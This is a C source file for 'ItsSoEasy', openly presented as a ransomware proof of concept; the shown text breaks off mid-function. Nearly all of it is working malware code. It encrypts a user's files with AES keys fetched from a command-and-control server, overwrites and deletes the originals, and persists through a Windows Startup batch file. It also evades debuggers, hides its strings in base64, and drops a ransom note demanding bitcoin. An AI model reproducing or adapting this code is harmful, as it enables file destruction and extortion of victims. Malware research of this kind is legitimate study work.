/*
ItsSoEasy -- Crypto-Ransomware Proof-of-Concept

''' ransomware version (C99) '''

What?
This is a Ransomware Concept written in C. Yes it is malicious. Yes, if you do that on VMs it is okay. Yes,
if you misconfigured the architecture or network and encrypt your own files they are gone forever.

Copyright (c) 2021/2022 Bastian Buck
Contact: https://github.com/bstnbuck

Attention! Use of the code samples and proof-of-concepts shown here is permitted solely at your own risk for academic
        and non-malicious purposes. It is the end user's responsibility to comply with all applicable local, state,
	and federal laws. The developer assumes no liability and is not responsible for any misuse or damage caused by this
        tool and the software in general.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// https://github.com/elzoughby/Base64
#include "src/b64.h"
#include "src/helper.h"


#ifdef _WIN32
    #include "src/openssl/aes.h"
    #include <unistd.h>
    #include <time.h>
#elif __linux__
    #include <openssl/aes.h>
    #include <sys/types.h>
    #include <sys/ptrace.h>
    #include <unistd.h>
    // make static bool declaration
    #define FALSE false
    #define TRUE true
    #define boolean bool
#endif


// using this GCC compiler on windows: https://sourceforge.net/projects/mingw-w64/

// Messages for connection with server
// execCodes
const int sendWelcome = 0;
const int getKeyAndIVToEnc = 1;
const int getHasPayed = 2;
const int getKeyAndIVToDec = 3;
const int removeIt = 4;

// additional
const char sucksha[] = "d2VsbCB0aGlzIHN1Y2tzLCBoYSE=";  // well this sucks, ha!
const char payd[] = "aGFzIHRoaXMgaWRpb3QgcGF5ZWQgdGhlIHJhbnNvbT8=";  // has this idiot payed the ransom?
const char ypay[] = "b2gsIHlvdSdyZSBnb29kIQ==";  // oh, you're good!
const char mny[] = "bW9uZXksIG1vbmV5LCBtb25leSE=";  // money, money, money!
const char hlp[] = "aSBuZWVkIHRoaXMgdG8gZnVjayB5b3UgdXAh"; // i need this to fuck you up!
const char kproc[] = "LS1LRVktUFJPQ0VEVVJFLS0=" ; // --KEY-PROCEDURE--

// Website content
const char websitecontent[] = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgPHRpdGxlPkJvb3RzdHJhcCBFeGFtcGxlPC90aXRsZT4KICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN0cmFwLzQuNS4yL2Nzcy9ib290c3RyYXAubWluLmNzcyI+CiAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzMuNS4xL2pxdWVyeS5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9wb3BwZXIuanMvMS4xNi4wL3VtZC9wb3BwZXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvNC41LjIvanMvYm9vdHN0cmFwLm1pbi5qcyI+PC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHk+Cgo8ZGl2IGNsYXNzPSJqdW1ib3Ryb24gdGV4dC1jZW50ZXIiPgogIDxoMT5JdHNTb0Vhc3khPC9oMT4KICA8cD5XaG9vcHMsIGl0IGxvb2tzIGxpa2UgYWxsIHlvdXIgcGVyc29uYWwgZGF0YSBoYXMgYmVlbiBlbmNyeXB0ZWQgd2l0aCBhbiBNaWxpdGFyeSBncmFkZSBlbmNyeXB0aW9uIGFsZ29yaXRobS48L2JyPgpUaGVyZSBpcyBubyB3YXkgdG8gcmVzdG9yZSB5b3VyIGRhdGEgd2l0aG91dCBhIHNwZWNpYWwga2V5LjwvYnI+Ck9ubHkgd2UgY2FuIGRlY3J5cHQgeW91ciBmaWxlcyE8L2JyPgpUbyBwdXJjaGFzZSB5b3VyIGtleSBhbmQgcmVzdG9yZSB5b3VyIGRhdGEsIHBsZWFzZSBmb2xsb3cgdGhlIHRocmVlIGVhc3kgc3RlcHMgYWZ0ZXJ3YXJkcy48L2JyPjwvYnI+CiAgIApXQVJOSU5HOjwvYnI+CkRvIE5PVCBhdHRlbXB0IHRvIGRlY3J5cHQgeW91ciBmaWxlcyB3aXRoIGFueSBzb2Z0d2FyZSBhcyBpdCBpcyBvYnNlbGV0ZSBhbmQgd2lsbCBub3Qgd29yaywgYW5kIG1heSBjb3N0IHlvdSBtb3JlIHRvIHVubG9jayB5b3VyIGZpbGVzLjwvYnI+CkRvIE5PVCBjaGFuZ2UgZmlsZSBuYW1lcywgbWVzcyB3aXRoIHRoZSBmaWxlcywgb3IgcnVuIGRlY2NyeXB0aW9uIHNvZnR3YXJlIGFzIGl0IHdpbGwgY29zdCB5b3UgbW9yZSB0byB1bmxvY2sgeW91ciBmaWxlcy0KLWFuZCB0aGVyZSBpcyBhIGhpZ2ggY2hhbmNlIHlvdSB3aWxsIGxvc2UgeW91ciBmaWxlcyBmb3JldmVyLjwvYnI+CkRvIE5PVCBzZW5kICJQQUlEIiBidXR0b24gd2l0aG91dCBwYXlpbmcsIHByaWNlIFdJTEwgZ28gdXAgZm9yIGRpc29iZWRpZW5jZS48L2JyPgpEbyBOT1QgdGhpbmsgdGhhdCB3ZSB3b250IGRlbGV0ZSB5b3VyIGZpbGVzIGFsdG9nZXRoZXIgYW5kIHRocm93IGF3YXkgdGhlIGtleSBpZiB5b3UgcmVmdXNlIHRvIHBheS4gV0UgV0lMTC4gPC9icj4KICAKICA8L3A+IAo8L2Rpdj4KICAKPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgPGRpdiBjbGFzcz0iY29sLXNtLTQiPgogICAgICA8aDM+U3RlcCAxPC9oMz4KICAgICAgPHA+RW1haWwgdXMgd2l0aCB0aGUgc3ViamVjdDwvYnI+PGI+ICJJIHdhbnQgbXkgZGF0YSBiYWNrIjwvYj48L2JyPiB0byBHZXRZb3VyRmlsZXNCYWNrQHByb3Rvbm1haWwuY29tPC9wPgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb2wtc20tNCI+CiAgICAgIDxoMz5TdGVwIDI8L2gzPgogICAgICA8cD49PiBZb3Ugd2lsbCByZWNpZXZlIHlvdXIgcGVyc29uYWwgQlRDIGFkZHJlc3MgZm9yIHBheW1lbnQuIFNlbmQgMC4wMSBCVEMgKEJpdGNvaW4pIHRvIHRoaXMgYWRkcmVzcy48L2JyPgogICA9PiBPbmNlIHBheW1lbnQgaGFzIGJlZW4gY29tcGxldGVkLCBzZW5kIGFub3RoZXIgZW1haWwgdG8gR2V0WW91ckZpbGVzQmFja0Bwcm90b25tYWlsLmNvbSBzdGF0aW5nICJQQUlEIi48L2JyPgogICA9PiBXZSB3aWxsIGNoZWNrIHRvIHNlZSBpZiBwYXltZW50IGhhcyBiZWVuIHBhaWQuPC9wPgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb2wtc20tNCI+CiAgICAgIDxoMz5TdGVwIDM8L2gzPiAgICAgICAgCiAgICAgIDxwPlRoZSBwcm9ncmFtIHdpbGwgYXV0b21hdGljYWxseSBjaGVjayBpbiB0aW1lIGludGVydmFscyBpZiB5b3UgaGF2ZSBwYWlkIGFuZCB3aWxsIGRlY3J5cHQgeW91ciBmaWxlcy48L3A+CiAgICAgIDxwPj0+IFRoZXJlZm9yZTogRG8gbm90IGtpbGwgdGhlIHByb2dyYW0gcHJvY2Vzcy4gT3RoZXJ3aXNlIHlvdXIgZGF0YSB3aWxsIGJlIGxvc3QhPC9wPgogICAgPC9kaXY+CiAgPC9kaXY+CjwvZGl2PgoKPC9ib2R5Pgo8L2h0bWw+Cg==";

// Messages
const char tkmsgMsg[] = "RGVjcnlwdCBmaWxlcyBub3c/";  // Decrypt files now?
const char tkmsg1Msg[] = "V2hvb3BzIHlvdXIgcGVyc29uYWwgZGF0YSB3YXMgZW5jcnlwdGVkISBSZWFkIHRoZSBpbmRleC5odG1sIG9uIHRoZSBEZXNrdG9wIGhvdyB0byBkZWNyeXB0IGl0"; // Whoops your personal data was encrypted! Read the index.html on the Desktop how to decrypt it
const char tkmsg2Msg[] = "Tm93IHlvdXIgZGF0YSBpcyBsb3N0";  // Now your data is lost
const char tkmsg3Msg[] = "SXQgd2FzIGFzIGVhc3kgYXMgSSBzYWlkLCBoYT8=";  // It was as easy as I said, ha?

// Files and directorys
// https://docs.microsoft.com/de-de/windows/win32/fileio/maximum-file-path-limitation?tabs=cmd
#define MAX_PATH 260
#define MAX_SOCK_BUF 1024
#define DELIMITER "-!-"

const char fileFiles[] = "L2lmX3lvdV9jaGFuZ2VfdGhpc19maWxlX3lvdXJfZGF0YV9pc19sb3N0";  // /if_you_change_this_file_your_data_is_lost
const char ident[] = "L2lkZW50aWZpZXI=";  // /identifier
const char ends[] = "Lml0c3NvZWFzeQ==";  // .itssoeasy

// chunk size to encrypt, not needed here
//const int datasize = AES_BLOCK_SIZE;

// for userIdentifier
#define NUM_RAND_BYTES 64

// os the program is running on
#ifdef _WIN32
    #define runtimeOS "windows" // Windows
#elif __linux__
    #define runtimeOS "linux" // Linux
#endif

// connection specific
const char hostname[] = "192.168.56.109";
const int PORT = 6666;


// https://cboard.cprogramming.com/c-programming/164689-how-get-users-home-directory.html
// get path of the user home
void getUserHomePath(char homedir[]){
#if defined(_WIN32)
    snprintf(homedir, MAX_PATH, "%s", getenv("USERPROFILE"));
#elif defined(__linux__)
    snprintf(homedir, MAX_PATH, "%s", getenv("HOME"));
#endif
}

void getFilePath(char filePath[]){
    // get path of the executable itself
    // https://docs.microsoft.com/de-de/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea?redirectedfrom=MSDN
#if defined(_WIN32)
    GetModuleFileNameA(NULL, filePath, MAX_PATH);
#elif defined(__linux__)
    readlink("/proc/self/exe", filePath, MAX_PATH);
#endif
}

// if debugger is present, only open google in a browser
void doSomethingElseWithDebugger(){
#ifdef _WIN32
    system("start https://google.de");
#elif __linux__
    system("xdg-open https://google.de");
#endif
}

// makeAutoRun needs a boolean, which shows the beginning or end of the ransomware lifecycle
void makeAutoRun(boolean kill){

#ifdef _WIN32
    char filePath[MAX_PATH];
    char bat_path[MAX_PATH];
    getUserHomePath(bat_path);
    strcat(bat_path, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");

    strcat(bat_path,"\\kill.bat");
    //println(bat_path);

    if (kill){
        remove(bat_path);
    }else{
        FILE *fp;
        fp = fopen(bat_path, "w");
        if (fp == NULL)
            return;
        getFilePath(filePath);
        fprintf(fp, "start \"\" \"%s\"", filePath);
        fclose(fp);

    }
#endif
}

// checks if the user has payed the ransom, normally the bitcoin blockchain is requested here,
// in this example a timer is set which automatically set this to true
boolean isPayed(int exeCode, char userIdentifier[], char additional[] ){
    char request[MAX_SOCK_BUF];
    char response[MAX_SOCK_BUF];
    int bytesRead;

    sprintf(request, "%d-!-%s-!-%s", exeCode, userIdentifier, additional);
    while (TRUE){
        SSL *sslSock = getTlsSocket(hostname, 6666);
        // ...
        if (sslSock != NULL){
            SSL_write(sslSock, request, (int)strlen(request));
            //println(request);
            while (TRUE){
                bytesRead = SSL_read(sslSock, response, sizeof(response));
                if (bytesRead < 1)
                    break;
            }
            //println(response);
            // DEBUG
            //println(response);
            // cut the response into variable strings
            char *recvExeCode = strtok(response, DELIMITER);
            char *recvUserIdent = strtok(NULL, DELIMITER);
            char *recvAdditional = strtok(NULL, DELIMITER);

            SSL_free(sslSock);
            if (strcmp(recvAdditional, "True") == 0 && atoi(recvExeCode) == exeCode && strcmp(recvUserIdent, userIdentifier) == 0)
                return TRUE;
            else
                return FALSE;
        }else{
            sleep(2);
            continue;
        }
    }
}

// sends a message to the server to remove all users db entries
void removeFromServer(int exeCode, char userIdentifier[], char additional[]){
    char request[MAX_SOCK_BUF];
    char response[MAX_SOCK_BUF];
    int bytesRead;

    //println(userIdentifier);
    sprintf(request, "%d-!-%s-!-%s", exeCode, userIdentifier, additional);
    while (TRUE){
        SSL *sslSock = getTlsSocket(hostname, 6666);
        // ...
        if (sslSock != NULL){
            SSL_write(sslSock, request, (int)strlen(request));
            //println(request);
            while (TRUE){
                bytesRead = SSL_read(sslSock, response, sizeof(response));
                if (bytesRead < 1)
                    break;
            }
            // DEBUG
            //println(response);

            SSL_free(sslSock);
            break;
        }else{
            sleep(2);
            continue;
        }
    }
}

// checks if the identifier.txt has a 0 at the end of file, if yes, files should be encrypted
boolean isEncrypted() {
    char filename[MAX_PATH];
    char homedir[MAX_PATH];
    getUserHomePath(homedir);
    snprintf(filename, MAX_PATH, "%s%s", homedir, base64_decode((char *)ident));

    FILE *fp = fopen(filename, "r");
    if (fp != NULL){
        // get char by char, if new line, stop
        while(TRUE) {
            int c = fgetc(fp);
            if ((char)c == '\n' || (char)c == EOF)
                break;
        }
        // check if after new line is '0', if yes, return true
        if (fgetc(fp) == '0')
            return TRUE;
        else return FALSE;
    }else{
        return FALSE;
    }
}

// make a first connection to the server
void runConnection(int exeCode, char userIdentifier[], char additional[]){
    char request[MAX_SOCK_BUF];
    char response[MAX_SOCK_BUF];
    int bytesRead;

    sprintf(request, "%d-!-%s-!-%s", exeCode, userIdentifier, additional);
    while (TRUE){
        SSL *sslSock = getTlsSocket(hostname, 6666);
        // ...
        if (sslSock != NULL){
            SSL_write(sslSock, request, (int)strlen(request));
            //println(request);
            while (TRUE){
                bytesRead = SSL_read(sslSock, response, sizeof(response));
                if (bytesRead < 1)
                    break;
            }
            //println(response);
            // DEBUG
            //println(response);
            char *mode = strtok(response, DELIMITER);
            char *ok = strtok(NULL, DELIMITER);

            if (strcmp(mode, "OK0") == 0 && strcmp(ok, "True") == 0)
                println("OK");
            SSL_free(sslSock);
            break;
        }else{
            sleep(2);
            continue;
        }
    }
}

// https://7thzero.com/blog/openssl-c-and-aes-encryption-just-scratching-surface
// encrypt all the files that are in a specific directory with the key and iv from the server
void encryptData(char *key, char *iv){
    AES_KEY enc_key;
    AES_set_encrypt_key((unsigned char*)key, 256, &enc_key);

    static char encryptedFileDB[MAX_PATH];
    static char homedir[MAX_PATH];
    static char path[MAX_PATH];

    // hard coded highest available array of strings => max 4096 files here!
    // that's not the best way to do this, normally it should be allocated with malloc/calloc and free()
    char *files[4096];
    char filesToFile[4096];
    char *filesToEncrypt[4096];

    //println("KEY_IV:");
    //println(key);
    //println(iv);

    // following lines => if static like testing: 10/66 virustotal; else 1/66
    getUserHomePath(path);
    strcat(path, "/testDir");
    //println(path);
    // walk the files to encrypt
    int n = walk(path, files);

    // windows testing
    //int n = walk("D:\\buckt\\Desktop\\ransomware_code\\c_code\\test", files);
    // linux testing
    //int n = walk("/home/bstnbuck/Dokumente/ransomware_thesis/c/test", files);
    
    // Debug
    /*for (int i = 0; i<n; i++){
        printf("%s\n",files[i]);
    }*/


    int extCount = 0;
    for (int i= 0; i<n; i++){
        if(hasExt(files[i])){
            //printf("%s\n", files[i]);
            strcat(filesToFile, files[i]);
            strcat(filesToFile, "\n");
            filesToEncrypt[i] = files[i];
            extCount++;
        }
    }


    // Debug
    /*
    for (int i = 0; i<sizeof(filesToEncrypt)/sizeof(filesToEncrypt[0]); i++){
        printf("%s\n",filesToEncrypt[i]);
    }
*/
    getUserHomePath(homedir);
    strcat(encryptedFileDB, homedir);
    strcat(encryptedFileDB, base64_decode((char *)fileFiles));

    FILE *fp = fopen(encryptedFileDB, "w");
    if (fp == NULL){
        println("NULL encryptedFileDB encryptData");
        println(encryptedFileDB);
        exit(EXIT_FAILURE);
    }
    fprintf(fp, "%s", filesToFile);
    fclose(fp);


    // iterate through string array
    for (int i = 0; i<sizeof(filesToEncrypt)/sizeof(filesToEncrypt[0]); i++){
        if (filesToEncrypt[i] == NULL)
            continue;
        char actFile[MAX_PATH] = {0};
        strcat(actFile, filesToEncrypt[i]);
        char newFile[MAX_PATH+10] = {0};
        strcat(newFile, actFile);
        strcat(newFile, base64_decode((char *)ends));
        //println("New File: ");
        //println(newFile);

        FILE *fActP = fopen(actFile, "rb");
        if (fActP == NULL){
            println("NULL actFile encryptData");
            exit(EXIT_FAILURE);
        }

        FILE *fEncP = fopen(newFile, "wb");
        if (fEncP == NULL){
            println("NULL newFile encryptData");
            exit(EXIT_FAILURE);
        }

        // get file size of old file
        fseek(fActP, 0, SEEK_END);
        long fileSize = ftell(fActP);
        fseek(fActP, 0, SEEK_SET);
        //printf("File size of %s: %ld\n", actFile, fileSize);


        int bufSize;
        // create buffer with padding of AES blocksize 16 bytes => 128 Bit
        if (fileSize %16 != 0){
            int count = (int)(16 - fileSize % 16);
            bufSize = fileSize+count;
        }else{
            bufSize = fileSize;
        }
        // calloc memory with the size of the file
        // calloc = malloc with filling with zeros
        unsigned char *chunk = calloc(bufSize,sizeof(unsigned char));
        //println("Malloced!");

        size_t read;
        if ((read = fread(chunk, 1, bufSize, fActP)) == 0){
            println("Nothing read!");
        }
        //printf("%s\n", chunk);

        //printf("%zu + %d\n", read, bufSize);
        if (read != bufSize){
            for (size_t j = read; j<bufSize; j++)
                chunk[j] = ' ';
        }
        unsigned char encrypted[bufSize];
        // encrypt the buffer
        AES_cbc_encrypt(chunk, encrypted, bufSize, &enc_key, (unsigned char*)iv, AES_ENCRYPT);
        //println("Encrypted!");

        if (fwrite(encrypted, 1, bufSize,fEncP ) == 0)
            println("Write to file failed!");

        // free allocated space
        free(chunk);

        /*
        // get file size of new file
        fseek(fEncP, 0, SEEK_END);
        int fileSizeEnc = ftell(fEncP);
        fseek(fEncP, 0, SEEK_SET);
        //printf("File size of encrypted %s: %d\n", newFile, fileSizeEnc);
*/
        fclose(fEncP);
        fclose(fActP);

        fActP = fopen(actFile, "wb");
        if (fActP == NULL)
            return;

        char nulls[fileSize];
        sprintf(nulls, "%.*s", (int)fileSize, "0");
        fwrite(nulls, 1, fileSize, fActP);
        fclose(fActP);
        remove(actFile);

    }
    char filename[MAX_PATH];
    snprintf(filename, MAX_PATH, "%s%s", homedir, base64_decode((char *)ident));
    FILE *fEncNowP = fopen(filename, "a");
    if (fEncNowP == NULL){
        println("NULL");
        return;
    }
    char null[] = "\n0";
    fwrite(null, 1, strlen(null), fEncNowP);
    fclose(fEncNowP);
}

// same procedure as in encrypt
boolean decryptData(char *key, char *iv){
    static char encryptedFileDB[MAX_PATH];
    static char homedir[MAX_PATH];

    AES_KEY dec_key;
    AES_set_decrypt_key((unsigned char*)key, 256, &dec_key);

    char *files[MAX_PATH];

    //println(key);
    //println(iv);

    getUserHomePath(homedir);
    strcat(encryptedFileDB, homedir);
    strcat(encryptedFileDB, base64_decode((char *)fileFiles));
    //println(encryptedFileDB);
    //printf("%s\n", key);

    FILE *fp = fopen(encryptedFileDB, "r");
    if (fp == NULL){
        println("NULL");
        exit(EXIT_FAILURE);
    }
    int fileCount = 0;
    char line[MAX_PATH];

    //println("SHOW files of file");
    // https://docs.microsoft.com/de-de/troubleshoot/cpp/fscanf-does-not-read-consecutive-line
    while(fscanf(fp, "%[^\n] ", line) != EOF){
        files[fileCount] = strdup(line);
        //printf("%s\n", files[fileCount]);
        fileCount++;
    }
    fclose(fp);

    // Debug
    /*
    println("Files...");
    for (int i = 0; i<fileCount; i++){
        printf("%s\n",files[i]);
    }
     */


    for (int i = 0; i<fileCount; i++){
        if (files[i] == NULL)
            continue;
        char file[MAX_PATH] = {0};

        strcat(file, files[i]);

        char encFile[MAX_PATH] = {0};
        strcat(encFile, file);
        strcat(encFile, base64_decode((char *) ends));
        /*
        println("Encrypted File: ");
        println(encFile);
        println("Decrypted File: ");
        println(file);
*/
        FILE *fEncP = fopen(encFile, "rb");
        if (fEncP == NULL){
            println("Open failed1!");
            fclose(fEncP);
            continue;
        }

        FILE *fDecP = fopen(file, "wb");
        if (fDecP == NULL){
            fclose(fEncP);
            fclose(fDecP);
            println("Open failed!");
            continue;
            //exit(EXIT_FAILURE);
        }

        fseek(fEncP, 0, SEEK_END);
        long orgFileSize = ftell(fEncP);
        fseek(fEncP, 0, SEEK_SET);
        //printf("Files size of encrypted %s: %ld\n", encFile, orgFileSize);

        unsigned long bufSize = orgFileSize;
        // allocate some RAM and zero it
        unsigned char *chunk = calloc(bufSize, sizeof(unsigned char));
        size_t read = fread(chunk, 1, bufSize, fEncP);

        fclose(fEncP);

        if (read == 0){
            free(chunk);
            fclose(fDecP);
            continue;
        }

        unsigned char decrypted[read];
        AES_cbc_encrypt(chunk, decrypted, read, &dec_key, (unsigned char*)iv, AES_DECRYPT);

        if (fwrite(decrypted, 1, read, fDecP) == 0){
            free(chunk);
            println("Nothing wrote!");
            break;
        }
        free(chunk);

        fclose(fDecP);

        FILE *fEncP2 = fopen(encFile, "wb");
        if (fEncP2 == NULL) {
            fclose(fEncP2);
            return FALSE;
        }
        char nulls[orgFileSize];
        sprintf(nulls, "%.*s", (int) orgFileSize, "0");
        fwrite(nulls, 1, orgFileSize, fEncP2);
        fclose(fEncP2);
        remove(encFile);

    }

    return TRUE;
}

// check if an identifier exists, otherwise generate a random 64 byte string and save it hexadecimal in the file
void checkUserIdentifier(char *userIdentifier){
    static char filename[MAX_PATH];
    static char homedir[MAX_PATH];
    getUserHomePath(homedir);
    snprintf(filename, MAX_PATH, "%s%s", homedir, base64_decode((char *)ident));

    FILE *fp = fopen(filename, "r");
    // check if exists
    if (fp == NULL){
        // if not, create it
        fp = fopen(filename, "w");
        srand(time(NULL));
        for (int i = 0; i < NUM_RAND_BYTES; i++){
            // https://stackoverflow.com/questions/12110209/how-to-fill-a-string-with-random-hex-characters
            // create string of random values as hex
            sprintf(userIdentifier + i, "%x", rand() % 16);
        }

        //printf("%s\n", userIdentifier);
        //printf("len: %llu\n", strlen(userIdentifier));
        fprintf(fp, "%s", userIdentifier);
        fclose(fp);
    }else{
        int read = fread(userIdentifier, 1, NUM_RAND_BYTES, fp);
        fclose(fp);
        //printf("%d\n",read);
        if (read != NUM_RAND_BYTES){
            //println("Create new!");
            remove(filename);
            fp = fopen(filename, "w");
            srand(time(NULL));
            for (int i = 0; i < NUM_RAND_BYTES; i++){
                // https://stackoverflow.com/questions/12110209/how-to-fill-a-string-with-random-hex-characters
                sprintf(userIdentifier + i, "%x", rand() % 16);
            }
            fprintf(fp, "%s", userIdentifier);
            fclose(fp);
        }
        //printf("len2: %llu\n", strlen(userIdentifier));
        //println(userIdentifier);
    }
}

// get the key and iv from the server and parse it for the correct sample
void getKey(char *key_iv[], int exeCode, char userIdentifier[], char additional[]){
    static char request[MAX_SOCK_BUF];
    static char response[MAX_SOCK_BUF];
    // key 32 bytes => 256 Bit
    // iv 16 bytes => 128 Bit
    static char key[32] = {0};
    static char iv[16] = {0};
    // char *recvAdditional;
    int bytesRead;

    sprintf(request, "%d-!-%s-!-%s", exeCode, userIdentifier, additional);
    //println(request);

    while (TRUE){
        SSL *sslSock = getTlsSocket(hostname, 6666);
        // ...
        if (sslSock != NULL){
            SSL_write(sslSock, request, (int)strlen(request));
            //println(request);
            while (TRUE){
                bytesRead = SSL_read(sslSock, response, sizeof(response));
                if (bytesRead < 1)
                    break;
            }
            // DEBUG
            //println(response);
            strtok(response, DELIMITER);
            strtok(NULL, DELIMITER);

            sprintf(key, "%s", strtok(NULL, DELIMITER));
            sprintf(iv, "%s", strtok(NULL, base64_decode((char *) kproc)));
            //printf("key,iv=> %s : %s\n", /*key_iv[0], key_iv[1]*/key, iv);

            SSL_free(sslSock);
            break;
        }else{
            sleep(2);
            continue;
        }
    }
    key_iv[0] = strdup(key);
    key_iv[1] = strdup(iv);
    //println(key_iv[0]);
    //println(key_iv[1]);
    return;
}

// shows a message box, creates a html file to show a warning to the user and how he can get his data back
void createAndShowMessage(){
    printf("%s [ENTER]",base64_decode((char *)tkmsg1Msg));
    getchar();

    char filename[MAX_PATH];
    char homedir[MAX_PATH];
    getUserHomePath(homedir);

#ifdef _WIN32
    snprintf(filename, MAX_PATH, "%sDesktop\\itssoeasy.html",homedir);
#elif __linux__
    snprintf(filename, MAX_PATH, "%s/Desktop/itssoeasy.html", homedir);
#endif
    FILE *fp = fopen(filename, "w");
    if (fp == NULL){
        snprintf(filename, MAX_PATH, "%s/itssoeasy.html", homedir);
        fp = fopen(filename, "w");
        if (fp == NULL)
            exit(EXIT_FAILURE);
    }
    fprintf(fp, "%s", base64_decode((char *) websitecontent));
    fclose(fp);

    char cmd[MAX_PATH];
#ifdef _WIN32
    snprintf(cmd, MAX_PATH, "start file://%s", filename);
    println("OK");
    system(cmd);
#elif __linux__
    // TODO check why program stops here!
    //sprintf(cmd, "xdg-open %s ", filename);
    //system(cmd);
#endif
}

// Linux version does not remove itself
// after decryption (or removing all) removes the ransomware itself with a batch or shell script
void selfRemove(){
#ifdef _WIN32
    char fname[] = "kill.bat";
    FILE *fp = fopen("kill.bat", "w+");
    if (fp == NULL)
        exit(EXIT_FAILURE);
    char filepath[MAX_PATH];
    getFilePath(filepath);
    fprintf(fp, "@ECHO OFF\n"
                "timeout /t 5 /nobreak > NUL\n"
                "type nul > \"%s\"\n"
                "DEL /q /s \"%s\"\n"
                "type nul > \"%s\"\n"
                "DEL /q /s \"%s\"",
                filepath, filepath, fname, fname);
    fclose(fp);

    // https://docs.microsoft.com/de-de/windows/win32/procthread/creating-processes
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    if( !CreateProcess( "C:\\Windows\\System32\\cmd.exe",   // No module name (use command line)
                        "/C kill.bat",        // Command line
                        NULL,           // Process handle not inheritable
                        NULL,           // Thread handle not inheritable
                        FALSE,          // Set handle inheritance to FALSE
                        0,              // No creation flags
                        NULL,           // Use parent's environment block
                        NULL,           // Use parent's starting directory
                        &si,            // Pointer to STARTUPINFO structure
                        &pi )           // Pointer to PROCESS_INFORMATION structure
            )
        println("Could not start process!");

#endif
}

// if the ransom is payed, show a useful message
boolean clientIsIdiot(){
    char isIdiot;
    printf("%s: y/n\n",base64_decode((char *) tkmsgMsg));
    scanf("%c", &isIdiot);
    if (isIdiot != 'n')
        return TRUE;
    else
        return FALSE;
}

// remove all files excepted the user is not an idiot or remove all ransomware files
void removeAllFiles(bool cId){
    static char identFile[MAX_PATH];
    static char homedir[MAX_PATH];
    static char encryptedFileDB[MAX_PATH];
    char *files[MAX_PATH];


    getUserHomePath(homedir);
    strcat(encryptedFileDB, homedir);
    strcat(encryptedFileDB, base64_decode((char *)fileFiles));

    strcat(identFile, homedir);
    strcat(identFile, base64_decode((char *)ident));


    if(cId){
        FILE *fp = fopen(encryptedFileDB, "r");
        if (fp != NULL){
            int fileCount = 0;
            char line[MAX_PATH];
            int fileSizeDec;

            //println("SHOW files of file");
            // https://docs.microsoft.com/de-de/troubleshoot/cpp/fscanf-does-not-read-consecutive-line
            while(fscanf(fp, "%[^\n] ", line) != EOF){
                strcat(line, ".itssoeasy");
                files[fileCount] = strdup(line);

                //printf("%s\n", files[fileCount]);
                fileCount++;
            }
            fclose(fp);

            for (int i = 0; i<fileCount; i++){
                if (files[i] == NULL)
                    continue;
                FILE *file = fopen(files[i], "wb");
                if (file == NULL) {
                    println("NULL: files[i] removeAllFiles cID");
                    println(files[i]);
                    return;
                }

                // get file size of old file
                fseek(file, 0, SEEK_END);
                fileSizeDec = ftell(file);
                fseek(file, 0, SEEK_SET);
                //printf("File size of decrypted %s: %d\n", files[i], fileSizeDec);

                char nulls[fileSizeDec];
                sprintf(nulls, "%.*s", fileSizeDec, "0");
                fwrite(nulls, sizeof(char), fileSizeDec, file);
                fclose(file);

                remove(files[i]);
            }

        }
        FILE *file = fopen(identFile, "wb");
        if (file == NULL) {
            println("NULL: identFile removeAllFiles");
            return;
        }

        // get file size of old file
        fseek(file, 0, SEEK_END);
        int fileSizeDec = ftell(file);
        fseek(file, 0, SEEK_SET);
        //printf("File size of %s: %d\n", identFile, fileSizeDec);

        char nulls[fileSizeDec];
        sprintf(nulls, "%.*s", fileSizeDec, "0");
        fwrite(nulls, sizeof(char), fileSizeDec, file);
        fclose(file);
        remove(identFile);

        println(base64_decode((char *)tkmsg2Msg));
    }else{
        FILE *file = fopen(identFile, "wb");
        if (file == NULL) {
            println("NULL: identFile removeAllFiles");
            println(identFile);
            return;
        }

        // get file size of old file
        fseek(file, 0, SEEK_END);
        int fileSizeDec = ftell(file);
        fseek(file, 0, SEEK_SET);
        //printf("File size of decrypted %s: %d\n", identFile, fileSizeDec);

        char nulls[fileSizeDec];
        sprintf(nulls, "%.*s", fileSizeDec, "0");
        fwrite(nulls, sizeof(char), fileSizeDec, file);
        fclose(file);
        remove(identFile);

        println(base64_decode((char *)tkmsg3Msg));
    }

    FILE *file = fopen(encryptedFileDB, "wb");
    if (file == NULL) {
        println("NULL: encryptedFileDB removeAllFiles !cID");
        println(encryptedFileDB);
        return;
    }

    // get file size of old file
    fseek(file, 0, SEEK_END);
    int fileSizeDec = ftell(file);
    fseek(file, 0, SEEK_SET);
    //printf("File size of decrypted %s: %d\n", encryptedFileDB, fileSizeDec);

    char nulls[fileSizeDec];
    sprintf(nulls, "%.*s", fileSizeDec, "0");
    fwrite(nulls, sizeof(char), fileSizeDec, file);
    fclose(file);
    remove(encryptedFileDB);

}

int runItsSoEasy(boolean debuggerPresent){
    // if a debugger is detected do something else with the user -> open google.de and exit
    if (debuggerPresent){
        // println("Debugger here!");
        doSomethingElseWithDebugger();
    }else{
